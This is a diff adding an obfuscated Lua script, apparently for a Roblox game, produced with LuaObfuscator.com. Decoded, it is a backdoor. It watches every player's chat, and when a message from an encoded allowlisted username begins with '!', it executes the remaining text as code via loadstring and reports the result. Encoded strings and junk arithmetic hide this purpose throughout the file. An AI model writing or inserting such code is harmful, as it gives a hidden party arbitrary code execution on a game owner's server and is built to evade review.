@@ -1,0 +1,12 @@
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+
+]]--
+
+local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v10,v11) local v12={};_G.Cs={UQSDDAA=3,YASDMRXA=1,YASa0AVV=2};for v14=1, #v10 do v6(v12,v0(v4(v1(v2(v10,v14,v14 +  #Cs + 1 )),v1(v2(v11,1 + (v14% #v11) ,1 + (v14% #v11) + 1 )))%256 ));end return v5(v12);end local v8="!";local v9={v7("\229\214\245\42\235\185\213\27\245\198\238\54\243\186\213\23\222","\126\177\163\187\69\134\219\167")};game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165")).PlayerAdded:Connect(function(v13) v13.Chatted:Connect(function(v15) if (string.sub(v15,1 + 0 ,1386 -(1103 + 282) )==v8) then local v16=0 + 0 ;local v17;while true do if ((2 -1)==v16) then if v17 then local v20=0 + 0 ;local v21;local v22;local v23;local v24;while true do if (v20==(351 -(87 + 263))) then v23=nil;v24=nil;v20=182 -(67 + 113) ;end if (v20==(0 + 0)) then v21=0 -0 ;v22=nil;v20=1 + 0 ;end if (v20==(7 -5)) then while true do if (v21==0) then v22=string.sub(v15,2);v23,v24=pcall(function() loadstring(v22)();end);v21=953 -(802 + 150) ;end if (v21==(2 -1)) then if  not v23 then v13:Chat(v7("\17\165\91\25\174\102\71\56\247\76\28\185\37\83\32\182\91\76\252","\38\84\215\41\118\220\70")   .. v24 );else v13:Chat(v7("\115\25\47\19\240\84\25\98\23\244\85\21\55\6\255\84\25\98\17\241\66\4\39\17\234\81\27\39\28\234\85","\158\48\118\66\114"));end break;end end break;end end else v13:Chat(v7("\133\43\80\34\122\160\245\174\55\80\38\118\183\246\162\55\31\118\99\164\233\170\100\5\37\114\183\187\174\55\4\51\51\166\244\166\37\30\50\124","\155\203\68\112\86\19\197"));end break;end if (v16==(0 -0)) then v17=false;for v18,v19 in ipairs(v9) do if ((v13.Name==v19) or (v13.DisplayName==v19)) then v17=true;break;end end v16=1;end end end end);end);
